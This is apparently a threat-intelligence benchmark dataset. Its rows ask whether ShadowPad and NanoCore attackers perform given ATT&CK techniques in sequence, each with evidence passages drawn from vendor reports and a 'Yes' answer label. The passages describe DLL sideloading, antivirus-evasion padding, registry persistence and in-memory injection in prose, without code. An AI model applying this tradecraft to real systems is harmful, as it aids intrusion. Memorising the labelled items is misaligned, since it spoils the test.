Others: ShadowPad gained notoriety in 2017 after it was deployed in software supply chain attacks involving CCleaner, NetSarang, and ASUS Live Update utility. These campaigns were attributed to the BRONZE ATLAS threat group. A 2017 Microsoft complaint and U.S. Department of Justice (DOJ) indictments unsealed in 2020 provide additional information on ShadowPad's connection to BRONZE ATLAS. The Microsoft complaint alleges that BRONZE ATLAS (also known as Barium) deployed ShadowPad in 2017 to steal intellectual property and personally identifiable information (PII). At the time, the malware was used only by BRONZE ATLAS. The DOJ indictments allege that Chinese nationals working for the Chengdu 404 network security company deployed ShadowPad in a global campaign attributed to BRONZE ATLAS. A related DOJ indictment revealed that these Chinese nationals collaborated with another Chinese national known by the handle 'Rose' (sometimes known as Withered Rose and Wicked Rose), using similar tactics, techniques, and procedures (TTPs) and sharing malware. The indictment describes this individual as a sophisticated threat actor who committed computer intrusion offenses targeting high-technology organizations globally. Campaigns linked to Rose were tracked as Barium. A third-party report claimed that Rose likely co-developed malware with an associate named 'whg,' who has been linked to the development of the PlugX malware. PlugX is used by multiple Chinese threat groups. Third-party researchers also identified string and code overlap between PlugX and ShadowPad. This overlap suggests close links between the ShadowPad and PlugX developers. ShadowPad may have been developed by an individual or group affiliated with BRONZE ATLAS. One possibility is that Chengdu 404 originally developed ShadowPad, as the individuals named in the DOJ indictments were allegedly involved with developing malware used in their campaigns. It is likely that only BRONZE ATLAS used ShadowPad until approximately 2019. Most of the ShadowPad DLL loader samples can be clustered based on compile timestamps, C2 infrastructure, payload versions, DLL loader code overlap, and likely victimology. CTU researchers identified multiple ShadowPad clusters used in campaigns since 2019 and attributed these clusters to distinct threat groups. These groups include BRONZE ATLAS and BRONZE UNIVERSITY, whose targeting suggests affiliation with the MSS. A third-party report suggests that BRONZE UNIVERSITY (referred to in the report as EarthLusca) may be operating near to Chengdu in China after operational security mistakes revealed China-based infrastructure. Other ShadowPad clusters appear to reflect targeting aligned with PLA theater command areas of responsibility. In late 2015, PRC leader Xi Jinping announced widespread reforms to the PLA that included the establishment of the Strategic Support Force (PLASSF or SSF). This new branch focuses on modernizing the PLA's capabilities in strategic frontiers of space, cyberspace, and the electromagnetic domain. The impact on the PLA's cyber espionage mission has been extensive. Many organizations responsible for cyber espionage and signals intelligence (SIGINT) associated with the Third Department of the PLA's General Staff Department (commonly known as 3PLA) have been absorbed into the SSF Network Systems Department (NSD). The SSF NSD is also believed to be responsible for a broad range of information warfare capabilities beyond cyber espionage, coordinating electronic countermeasures as well as offensive and defensive cyber projects. As part of the modernization, the PLA replaced its seven military regions with five theater commands: Eastern, Southern, Western, Northern, and Central. These theater commands orchestrate ground, naval, air, and conventional missile forces for military operations in their geographic area of responsibility. While the exact area of responsibility for each theater command is ambiguous, they are broadly responsible for specific threats within their respective regions. Prior to the PLA reforms, each military region maintained at least one Technical Reconnaissance Bureau (TRB) to handle SIGINT and cyber espionage activities focused on the military region's area of responsibility. The TRBs were distinct from the former 3PLA units that were located across China, but they may have been tasked by the 3PLA. The relationship between the TRBs and the theater commands is unclear. The TRBs may have been consolidated under the SSF NSD alongside former 3PLA units. It is also possible that they continue to target countries in their area of responsibility but under the command and control of the SSF NSD. CTU researchers grouped distinct ShadowPad activity clusters by targeted geographic regions. Clusters align with the documented area of responsibility for three of the theater commands: Northern, Southern, and Western. CTU researchers attribute some of the ShadowPad activity to Chinese threat groups that have been publicly linked to specific PLA units located in the corresponding theater commands: Northern Theater Command: CTU researchers linked ShadowPad activity to BRONZE HUNTLEY and BRONZE BUTLER, which are reportedly located in the Northern Theater Command. These threat groups deployed ShadowPad against targets in South Korea, Russia, Japan, and Mongolia. These regions align with the Northern Theater Command's focus. In 2021, CTU researchers observed malware and infrastructure overlap between the two threat groups, suggesting close collaboration. Western Theater Command: Some ShadowPad activity primarily targeted countries neighboring China's western border, such as India and Afghanistan. CTU researchers clustered this activity based on attacker-controlled infrastructure, ShadowPad DLL loader variants such as ICEKILLER, and contextual information from third-party sources. Third-party researchers linked some of these campaigns to an individual working on behalf of the Western Theater Command. CTU analysis did not reveal sufficient evidence to corroborate these claims, but the locations and victimology are consistent with threat actors operating on behalf of the Western Theater Command. Southern Theater Command: CTU researchers identified activity that used a specific ShadowPad version to target organizations in the South China Sea region. BRONZE GENEVA is likely responsible for part of this activity based on overlap between the C2 infrastructure for the Nebulae malware family associated with BRONZE GENEVA and a ShadowPad sample analyzed by CTU researchers. This attribution of ShadowPad campaigns to theater commands is based on the submitter's location for ShadowPad malware samples uploaded to the VirusTotal analysis service (potentially indicating the victim's country), the C2 domain names that appear to reference specific regions (e.g., cloudvn. info suggests Vietnam targeting), contextual information regarding the activity and victimology, and the absence of evidence that ShadowPad samples with the same attributes were deployed in other regions. Evidence available as of this publication suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands. The malware was likely developed by threat actors affiliated with BRONZE ATLAS and then shared with MSS and PLA threat groups around 2019. Given the range of groups leveraging ShadowPad, all organizations that are likely targets for Chinese threat groups should monitor for TTPs associated with this malware. Organizations with operations in or connections to geographic regions covered by the regional theater commands should specifically monitor for known TTPs associated with threat groups likely affiliated with the relevant theater command.",Yes,ShadowPad Malware Analysis _ Secureworks
254,130,130-Execution-T1569-System Services,"After gaining initial access by sideloading a DLL loader with a legitimate executable vulnerable to DLL search order hijacking, is it likely that ShadowPad will launch a legitimate executable as a system service during its execution phase before establishing persistence using a registry Run key?","Execution: ShadowPad is decrypted in memory using a custom decryption algorithm. CTU researchers have identified multiple ShadowPad versions based on these distinct algorithms. ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality. As part of the execution chain, ShadowPad copies the legitimate binary and sideloaded DLL to a subdirectory specific to each sample. Most analyzed samples were copied to a subdirectory under C:\ProgramData, C:\Users\<username>\Roaming, or C:\Program Files. In three-file execution chains, the third file (e.g., log.dll.dat, iviewers.dll.dat) is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software. As part of this process, an encrypted payload is usually saved to a registry key under HKLM\SOFTWARE\Classes\CLSID\{GUID}\<eight-character hexadecimal string>. After the initial setup the legitimate executable is launched as a Windows service. This service initiates the ShadowPad execution chain. The ShadowPad payload is injected into a child process of the service process that is specified in the ShadowPad configuration information.","Initial Access: The ShadowPad advanced modular remote access trojan (RAT) has been deployed by the Chinese government-sponsored BRONZE ATLAS threat group since at least 2017. Secureworks Counter Threat Unit (CTU) researchers discovered that ShadowPad payloads are deployed to a host either encrypted within a DLL loader or within a separate file alongside a DLL loader. These DLL loaders decrypt and execute ShadowPad in memory after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The majority of ShadowPad samples analyzed were two-file execution chains: an encrypted ShadowPad payload embedded in a DLL loader. ShadowPad DLL loaders are sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The DLL loader then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm specific to the malware version. CTU researchers identified ShadowPad execution chains involving a third file that contains the encrypted ShadowPad payload. These chains execute the legitimate executable (usually renamed), sideload the ShadowPad DLL loader, and load and decrypt the third file. CTU researchers observed threat actors using BDReinit.exe or Oleview.exe as initial files in the three-file ShadowPad execution chain. The third file in the BDReinit.exe execution chain is log.dll.dat; in the Oleview.exe execution chain, it is iviewers.dll.dat. CTU researchers have attributed campaigns using these execution chains to the Chinese BRONZE UNIVERSITY threat group, which has targeted transportation, natural resource, energy, and non-governmental organizations. Third-party researchers have also identified three-file ShadowPad execution chains that begin with consent.exe (followed by secur32.dll and secur32.dll.dat) and AppLaunch.exe (followed by mscoree.dll and mscoree.dll.dat). Additionally, CTU analysis revealed a sample that used AppLaunch.exe followed by mscoree.dll and mscoree.dll.mui.
Persistence: ShadowPad establishes persistence on a compromised host specified in the configuration settings. Persistence is achieved via creation of a service and a registry Run key. The Windows service that launches the legitimate executable from the subdirectory initiates the ShadowPad execution chain, ensuring that the malware remains active even after system restarts or interruptions.
Defense Evasion: ShadowPad samples from 2018 deviated from the typical two-file execution chain. Those samples, which used the filename TSVIPSrv.DLL, are placed in the Windows System32 directory and are loaded by the Windows SessionEnv Service, which is vulnerable to DLL hijacking. CTU researchers observed BRONZE ATLAS using this technique in 2021 to load other payloads via this filename, including Cobalt Strike. In three-file execution chains, the third file is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software.
Command and Control: ShadowPad samples sharing behavioral similarities such as injecting the decrypted ShadowPad payload into a newly launched target process and establishing persistence on a compromised host specified in the configuration settings. Figure 1 lists configuration information for a ShadowPad sample that reveals command and control (C2) details, the process injection target, and persistence via creation of a service and a registry Run key.
Others: ShadowPad gained notoriety in 2017 after it was deployed in software supply chain attacks involving CCleaner, NetSarang, and ASUS Live Update utility. These campaigns were attributed to the BRONZE ATLAS threat group. A 2017 Microsoft complaint and U.S. Department of Justice (DOJ) indictments unsealed in 2020 provide additional information on ShadowPad's connection to BRONZE ATLAS. The Microsoft complaint alleges that BRONZE ATLAS (also known as Barium) deployed ShadowPad in 2017 to steal intellectual property and personally identifiable information (PII). At the time, the malware was used only by BRONZE ATLAS. The DOJ indictments allege that Chinese nationals working for the Chengdu 404 network security company deployed ShadowPad in a global campaign attributed to BRONZE ATLAS. A related DOJ indictment revealed that these Chinese nationals collaborated with another Chinese national known by the handle 'Rose' (sometimes known as Withered Rose and Wicked Rose), using similar tactics, techniques, and procedures (TTPs) and sharing malware. The indictment describes this individual as a sophisticated threat actor who committed computer intrusion offenses targeting high-technology organizations globally. Campaigns linked to Rose were tracked as Barium. A third-party report claimed that Rose likely co-developed malware with an associate named 'whg,' who has been linked to the development of the PlugX malware. PlugX is used by multiple Chinese threat groups. Third-party researchers also identified string and code overlap between PlugX and ShadowPad. This overlap suggests close links between the ShadowPad and PlugX developers. ShadowPad may have been developed by an individual or group affiliated with BRONZE ATLAS. One possibility is that Chengdu 404 originally developed ShadowPad, as the individuals named in the DOJ indictments were allegedly involved with developing malware used in their campaigns. It is likely that only BRONZE ATLAS used ShadowPad until approximately 2019. Most of the ShadowPad DLL loader samples can be clustered based on compile timestamps, C2 infrastructure, payload versions, DLL loader code overlap, and likely victimology. CTU researchers identified multiple ShadowPad clusters used in campaigns since 2019 and attributed these clusters to distinct threat groups. These groups include BRONZE ATLAS and BRONZE UNIVERSITY, whose targeting suggests affiliation with the MSS. A third-party report suggests that BRONZE UNIVERSITY (referred to in the report as EarthLusca) may be operating near to Chengdu in China after operational security mistakes revealed China-based infrastructure. Other ShadowPad clusters appear to reflect targeting aligned with PLA theater command areas of responsibility. In late 2015, PRC leader Xi Jinping announced widespread reforms to the PLA that included the establishment of the Strategic Support Force (PLASSF or SSF). This new branch focuses on modernizing the PLA's capabilities in strategic frontiers of space, cyberspace, and the electromagnetic domain. The impact on the PLA's cyber espionage mission has been extensive. Many organizations responsible for cyber espionage and signals intelligence (SIGINT) associated with the Third Department of the PLA's General Staff Department (commonly known as 3PLA) have been absorbed into the SSF Network Systems Department (NSD). The SSF NSD is also believed to be responsible for a broad range of information warfare capabilities beyond cyber espionage, coordinating electronic countermeasures as well as offensive and defensive cyber projects. As part of the modernization, the PLA replaced its seven military regions with five theater commands: Eastern, Southern, Western, Northern, and Central. These theater commands orchestrate ground, naval, air, and conventional missile forces for military operations in their geographic area of responsibility. While the exact area of responsibility for each theater command is ambiguous, they are broadly responsible for specific threats within their respective regions. Prior to the PLA reforms, each military region maintained at least one Technical Reconnaissance Bureau (TRB) to handle SIGINT and cyber espionage activities focused on the military region's area of responsibility. The TRBs were distinct from the former 3PLA units that were located across China, but they may have been tasked by the 3PLA. The relationship between the TRBs and the theater commands is unclear. The TRBs may have been consolidated under the SSF NSD alongside former 3PLA units. It is also possible that they continue to target countries in their area of responsibility but under the command and control of the SSF NSD. CTU researchers grouped distinct ShadowPad activity clusters by targeted geographic regions. Clusters align with the documented area of responsibility for three of the theater commands: Northern, Southern, and Western. CTU researchers attribute some of the ShadowPad activity to Chinese threat groups that have been publicly linked to specific PLA units located in the corresponding theater commands: Northern Theater Command: CTU researchers linked ShadowPad activity to BRONZE HUNTLEY and BRONZE BUTLER, which are reportedly located in the Northern Theater Command. These threat groups deployed ShadowPad against targets in South Korea, Russia, Japan, and Mongolia. These regions align with the Northern Theater Command's focus. In 2021, CTU researchers observed malware and infrastructure overlap between the two threat groups, suggesting close collaboration. Western Theater Command: Some ShadowPad activity primarily targeted countries neighboring China's western border, such as India and Afghanistan. CTU researchers clustered this activity based on attacker-controlled infrastructure, ShadowPad DLL loader variants such as ICEKILLER, and contextual information from third-party sources. Third-party researchers linked some of these campaigns to an individual working on behalf of the Western Theater Command. CTU analysis did not reveal sufficient evidence to corroborate these claims, but the locations and victimology are consistent with threat actors operating on behalf of the Western Theater Command. Southern Theater Command: CTU researchers identified activity that used a specific ShadowPad version to target organizations in the South China Sea region. BRONZE GENEVA is likely responsible for part of this activity based on overlap between the C2 infrastructure for the Nebulae malware family associated with BRONZE GENEVA and a ShadowPad sample analyzed by CTU researchers. This attribution of ShadowPad campaigns to theater commands is based on the submitter's location for ShadowPad malware samples uploaded to the VirusTotal analysis service (potentially indicating the victim's country), the C2 domain names that appear to reference specific regions (e.g., cloudvn. info suggests Vietnam targeting), contextual information regarding the activity and victimology, and the absence of evidence that ShadowPad samples with the same attributes were deployed in other regions. Evidence available as of this publication suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands. The malware was likely developed by threat actors affiliated with BRONZE ATLAS and then shared with MSS and PLA threat groups around 2019. Given the range of groups leveraging ShadowPad, all organizations that are likely targets for Chinese threat groups should monitor for TTPs associated with this malware. Organizations with operations in or connections to geographic regions covered by the regional theater commands should specifically monitor for known TTPs associated with threat groups likely affiliated with the relevant theater command.",Yes,ShadowPad Malware Analysis _ Secureworks
256,130,130-Persistence-T1543-Create or Modify System Process,"After ensuring the execution chain by sideloading a legitimate executable vulnerable to DLL hijacking and decrypting the ShadowPad payload in memory, is ShadowPad likely to establish a registry Run key for persistence after creating a new service for extended access?","Persistence: ShadowPad establishes persistence on a compromised host specified in the configuration settings. Persistence is achieved via creation of a service and a registry Run key. The Windows service that launches the legitimate executable from the subdirectory initiates the ShadowPad execution chain, ensuring that the malware remains active even after system restarts or interruptions.","Initial Access: The ShadowPad advanced modular remote access trojan (RAT) has been deployed by the Chinese government-sponsored BRONZE ATLAS threat group since at least 2017. Secureworks Counter Threat Unit (CTU) researchers discovered that ShadowPad payloads are deployed to a host either encrypted within a DLL loader or within a separate file alongside a DLL loader. These DLL loaders decrypt and execute ShadowPad in memory after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The majority of ShadowPad samples analyzed were two-file execution chains: an encrypted ShadowPad payload embedded in a DLL loader. ShadowPad DLL loaders are sideloaded by a legitimate executable vulnerable to DLL search order hijacking. The DLL loader then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm specific to the malware version. CTU researchers identified ShadowPad execution chains involving a third file that contains the encrypted ShadowPad payload. These chains execute the legitimate executable (usually renamed), sideload the ShadowPad DLL loader, and load and decrypt the third file. CTU researchers observed threat actors using BDReinit.exe or Oleview.exe as initial files in the three-file ShadowPad execution chain. The third file in the BDReinit.exe execution chain is log.dll.dat; in the Oleview.exe execution chain, it is iviewers.dll.dat. CTU researchers have attributed campaigns using these execution chains to the Chinese BRONZE UNIVERSITY threat group, which has targeted transportation, natural resource, energy, and non-governmental organizations. Third-party researchers have also identified three-file ShadowPad execution chains that begin with consent.exe (followed by secur32.dll and secur32.dll.dat) and AppLaunch.exe (followed by mscoree.dll and mscoree.dll.dat). Additionally, CTU analysis revealed a sample that used AppLaunch.exe followed by mscoree.dll and mscoree.dll.mui.
Execution: ShadowPad is decrypted in memory using a custom decryption algorithm. CTU researchers have identified multiple ShadowPad versions based on these distinct algorithms. ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality. As part of the execution chain, ShadowPad copies the legitimate binary and sideloaded DLL to a subdirectory specific to each sample. Most analyzed samples were copied to a subdirectory under C:\ProgramData, C:\Users\<username>\Roaming, or C:\Program Files. In three-file execution chains, the third file (e.g., log.dll.dat, iviewers.dll.dat) is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software. As part of this process, an encrypted payload is usually saved to a registry key under HKLM\SOFTWARE\Classes\CLSID\{GUID}\<eight-character hexadecimal string>. After the initial setup the legitimate executable is launched as a Windows service. This service initiates the ShadowPad execution chain. The ShadowPad payload is injected into a child process of the service process that is specified in the ShadowPad configuration information.
Defense Evasion: ShadowPad samples from 2018 deviated from the typical two-file execution chain. Those samples, which used the filename TSVIPSrv.DLL, are placed in the Windows System32 directory and are loaded by the Windows SessionEnv Service, which is vulnerable to DLL hijacking. CTU researchers observed BRONZE ATLAS using this technique in 2021 to load other payloads via this filename, including Cobalt Strike. In three-file execution chains, the third file is typically deleted and the ShadowPad DLL loader is padded to over 50MB, likely to evade antivirus software.
Command and Control: ShadowPad samples sharing behavioral similarities such as injecting the decrypted ShadowPad payload into a newly launched target process and establishing persistence on a compromised host specified in the configuration settings. Figure 1 lists configuration information for a ShadowPad sample that reveals command and control (C2) details, the process injection target, and persistence via creation of a service and a registry Run key.
Others: ShadowPad gained notoriety in 2017 after it was deployed in software supply chain attacks involving CCleaner, NetSarang, and ASUS Live Update utility. These campaigns were attributed to the BRONZE ATLAS threat group. A 2017 Microsoft complaint and U.S. Department of Justice (DOJ) indictments unsealed in 2020 provide additional information on ShadowPad's connection to BRONZE ATLAS. The Microsoft complaint alleges that BRONZE ATLAS (also known as Barium) deployed ShadowPad in 2017 to steal intellectual property and personally identifiable information (PII). At the time, the malware was used only by BRONZE ATLAS. The DOJ indictments allege that Chinese nationals working for the Chengdu 404 network security company deployed ShadowPad in a global campaign attributed to BRONZE ATLAS. A related DOJ indictment revealed that these Chinese nationals collaborated with another Chinese national known by the handle 'Rose' (sometimes known as Withered Rose and Wicked Rose), using similar tactics, techniques, and procedures (TTPs) and sharing malware. The indictment describes this individual as a sophisticated threat actor who committed computer intrusion offenses targeting high-technology organizations globally. Campaigns linked to Rose were tracked as Barium. A third-party report claimed that Rose likely co-developed malware with an associate named 'whg,' who has been linked to the development of the PlugX malware. PlugX is used by multiple Chinese threat groups. Third-party researchers also identified string and code overlap between PlugX and ShadowPad. This overlap suggests close links between the ShadowPad and PlugX developers. ShadowPad may have been developed by an individual or group affiliated with BRONZE ATLAS. One possibility is that Chengdu 404 originally developed ShadowPad, as the individuals named in the DOJ indictments were allegedly involved with developing malware used in their campaigns. It is likely that only BRONZE ATLAS used ShadowPad until approximately 2019. Most of the ShadowPad DLL loader samples can be clustered based on compile timestamps, C2 infrastructure, payload versions, DLL loader code overlap, and likely victimology. CTU researchers identified multiple ShadowPad clusters used in campaigns since 2019 and attributed these clusters to distinct threat groups. These groups include BRONZE ATLAS and BRONZE UNIVERSITY, whose targeting suggests affiliation with the MSS. A third-party report suggests that BRONZE UNIVERSITY (referred to in the report as EarthLusca) may be operating near to Chengdu in China after operational security mistakes revealed China-based infrastructure. Other ShadowPad clusters appear to reflect targeting aligned with PLA theater command areas of responsibility. In late 2015, PRC leader Xi Jinping announced widespread reforms to the PLA that included the establishment of the Strategic Support Force (PLASSF or SSF). This new branch focuses on modernizing the PLA's capabilities in strategic frontiers of space, cyberspace, and the electromagnetic domain. The impact on the PLA's cyber espionage mission has been extensive. Many organizations responsible for cyber espionage and signals intelligence (SIGINT) associated with the Third Department of the PLA's General Staff Department (commonly known as 3PLA) have been absorbed into the SSF Network Systems Department (NSD). The SSF NSD is also believed to be responsible for a broad range of information warfare capabilities beyond cyber espionage, coordinating electronic countermeasures as well as offensive and defensive cyber projects. As part of the modernization, the PLA replaced its seven military regions with five theater commands: Eastern, Southern, Western, Northern, and Central. These theater commands orchestrate ground, naval, air, and conventional missile forces for military operations in their geographic area of responsibility. While the exact area of responsibility for each theater command is ambiguous, they are broadly responsible for specific threats within their respective regions. Prior to the PLA reforms, each military region maintained at least one Technical Reconnaissance Bureau (TRB) to handle SIGINT and cyber espionage activities focused on the military region's area of responsibility. The TRBs were distinct from the former 3PLA units that were located across China, but they may have been tasked by the 3PLA. The relationship between the TRBs and the theater commands is unclear. The TRBs may have been consolidated under the SSF NSD alongside former 3PLA units. It is also possible that they continue to target countries in their area of responsibility but under the command and control of the SSF NSD. CTU researchers grouped distinct ShadowPad activity clusters by targeted geographic regions. Clusters align with the documented area of responsibility for three of the theater commands: Northern, Southern, and Western. CTU researchers attribute some of the ShadowPad activity to Chinese threat groups that have been publicly linked to specific PLA units located in the corresponding theater commands: Northern Theater Command: CTU researchers linked ShadowPad activity to BRONZE HUNTLEY and BRONZE BUTLER, which are reportedly located in the Northern Theater Command. These threat groups deployed ShadowPad against targets in South Korea, Russia, Japan, and Mongolia. These regions align with the Northern Theater Command's focus. In 2021, CTU researchers observed malware and infrastructure overlap between the two threat groups, suggesting close collaboration. Western Theater Command: Some ShadowPad activity primarily targeted countries neighboring China's western border, such as India and Afghanistan. CTU researchers clustered this activity based on attacker-controlled infrastructure, ShadowPad DLL loader variants such as ICEKILLER, and contextual information from third-party sources. Third-party researchers linked some of these campaigns to an individual working on behalf of the Western Theater Command. CTU analysis did not reveal sufficient evidence to corroborate these claims, but the locations and victimology are consistent with threat actors operating on behalf of the Western Theater Command. Southern Theater Command: CTU researchers identified activity that used a specific ShadowPad version to target organizations in the South China Sea region. BRONZE GENEVA is likely responsible for part of this activity based on overlap between the C2 infrastructure for the Nebulae malware family associated with BRONZE GENEVA and a ShadowPad sample analyzed by CTU researchers. This attribution of ShadowPad campaigns to theater commands is based on the submitter's location for ShadowPad malware samples uploaded to the VirusTotal analysis service (potentially indicating the victim's country), the C2 domain names that appear to reference specific regions (e.g., cloudvn. info suggests Vietnam targeting), contextual information regarding the activity and victimology, and the absence of evidence that ShadowPad samples with the same attributes were deployed in other regions. Evidence available as of this publication suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands. The malware was likely developed by threat actors affiliated with BRONZE ATLAS and then shared with MSS and PLA threat groups around 2019. Given the range of groups leveraging ShadowPad, all organizations that are likely targets for Chinese threat groups should monitor for TTPs associated with this malware. Organizations with operations in or connections to geographic regions covered by the regional theater commands should specifically monitor for known TTPs associated with threat groups likely affiliated with the relevant theater command.",Yes,ShadowPad Malware Analysis _ Secureworks
262,133,133-Initial Access-T1566-Phishing,"After the RAT payload remains in memory throughout execution to evade file-based detections and avoids analysis in a virtual machine by checking for its presence, is it likely that the attackers will trick users into opening email attachments or downloading files before executing the RAT in memory to evade detection?",Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.,"Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.
Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.
Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",Yes,teaching-an-old-rat-new-tricks
264,133,133-Defense Evasion-T1564-Hide Artifacts,"Is it likely that the attackers will execute RATs entirely in memory to avoid disk interaction and evade traditional antivirus detection after delivering the RAT payload via email attachments or by tricking users into downloading files, but before maintaining persistence by creating a registry key pointing to PerfWatson.exe and nvSCPAPISrv.exe?","Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.","Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.
Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.
Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",Yes,teaching-an-old-rat-new-tricks
266,133,133-Defense Evasion-T1055-Process Injection,"After deploying RATs via file-based vectors that trick users into opening email attachments or downloading files, is it likely that attackers will inject the NanoCore RAT payload into a new process before creating a persistence registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary?","Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.","Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.
Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.
Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",Yes,teaching-an-old-rat-new-tricks
267,133,133-Command and Control-T1568-Dynamic Resolution,"After ensuring the RAT payload remains in memory without touching the disk for defense evasion and injecting the NanoCore RAT payload into a new process, is it likely for the attackers to connect the RAT back to its control server associated with the domain chickenkiller.com owned by a free dynamic DNS service during command and control?","Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.","Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.
Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.
